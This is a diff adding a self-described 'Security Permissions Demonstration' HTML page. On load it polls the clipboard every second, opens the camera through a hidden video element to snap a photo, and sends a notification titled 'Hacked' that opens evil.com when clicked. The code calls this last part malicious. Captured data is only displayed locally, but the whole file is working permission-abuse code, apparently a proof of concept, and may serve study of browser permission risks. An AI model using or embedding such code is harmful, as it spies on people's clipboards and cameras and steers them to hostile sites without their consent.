@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Security Permissions Demonstration</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        .container {
+            margin-bottom: 25px;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        h3 {
+            margin-bottom: 10px;
+        }
+        .data-box {
+            border: 1px dashed #ccc;
+            padding: 10px;
+            min-height: 50px;
+            word-wrap: break-word;
+            background-color: #f9f9f9;
+        }
+        #capturedImage {
+            max-width: 100%;
+            height: auto;
+            border: 1px solid #ccc;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body onload="initiateDemonstration();">
+    <h1>Demonstrating Direct Access to Security Permissions</h1>
+    
+    <div class="container">
+        <h3>Clipboard Data:</h3>
+        <div id="clipboardResult" class="data-box">[Polling for clipboard content...]</div>
+    </div>
+
+    <div class="container">
+        <h3>Captured Image:</h3>
+        <img id="capturedImage" class="hidden" alt="Captured image will be displayed here."/>
+    </div>
+
+    <div class="container">
+        <h3>Notification:</h3>
+        <div id="notificationResult" class="data-box">[Awaiting notification trigger...]</div>
+    </div>
+
+    <!-- Hidden video element required for camera access -->
+    <video id="videoElement" class="hidden" autoplay playsinline></video>
+
+    <script>
+        /**
+         * 1. CLIPBOARD POLLING
+         * Continuously checks the clipboard and writes its content to the designated textbox.
+         */
+        function pollClipboard() {
+            setInterval(() => {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    navigator.clipboard.readText().then((clipText) => {
+                        const clipboardResultEl = document.getElementById("clipboardResult");
+                        // Update the textbox only if the content has changed.
+                        if (clipText && clipboardResultEl.innerText !== clipText) {
+                            clipboardResultEl.innerText = clipText;
+                        }
+                    }).catch((err) => {
+                        // Fail silently in a secure context where permission is denied.
+                    });
+                }
+            }, 1000); // Check every second
+        }
+
+        /**
+         * 2. CAMERA CAPTURE
+         * Requests camera access, captures a single image, and displays it on the page.
+         */
+        function captureFromCamera() {
+            const videoElement = document.getElementById('videoElement');
+            const capturedImageEl = document.getElementById('capturedImage');
+
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then((stream) => {
+                        videoElement.srcObject = stream;
+                        // Capture an image after a short delay to allow the camera to initialize.
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = videoElement.videoWidth;
+                            canvas.height = videoElement.videoHeight;
+                            const context = canvas.getContext('2d');
+                            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                            
+                            // Display the captured image
+                            capturedImageEl.src = canvas.toDataURL('image/png');
+                            capturedImageEl.classList.remove('hidden');
+
+                            // Stop all video tracks to turn off the camera light.
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 2000); // 2-second delay
+                    }).catch((err) => {
+                        console.error("Camera access denied:", err);
+                        capturedImageEl.alt = "Camera access was denied.";
+                        capturedImageEl.classList.remove('hidden');
+                    });
+            }
+        }
+
+        /**
+         * 3. STANDALONE NOTIFICATION
+         * Triggers a specific, hardcoded notification that redirects to a malicious site.
+         */
+        function triggerMaliciousNotification() {
+            const notificationResultEl = document.getElementById('notificationResult');
+            const title = 'Hacked';
+            const options = {
+                body: 'Granting Access to User Security Permissions',
+                icon: 'https://www.google.com/favicon.ico' // Example icon
+            };
+            const redirectUrl = 'https://evil.com';
+
+            if ('Notification' in window) {
+                Notification.requestPermission().then((permission) => {
+                    if (permission === 'granted') {
+                        const notification = new Notification(title, options);
+                        notification.onclick = () => {
+                            window.open(redirectUrl, '_blank');
+                        };
+                        notificationResultEl.innerText = 'Malicious notification has been sent successfully.';
+                    } else {
+                        notificationResultEl.innerText = 'Notification permission was denied.';
+                    }
+                });
+            } else {
+                 notificationResultEl.innerText = 'Notifications are not supported in this browser.';
+            }
+        }
+
+        /**
+         * INITIATOR
+         * Runs all the separate demonstration functions once the page loads.
+         */
+        function initiateDemonstration() {
+            pollClipboard();
+            captureFromCamera();
+            triggerMaliciousNotification();
+        }
+    </script>
+</body>
+</html>
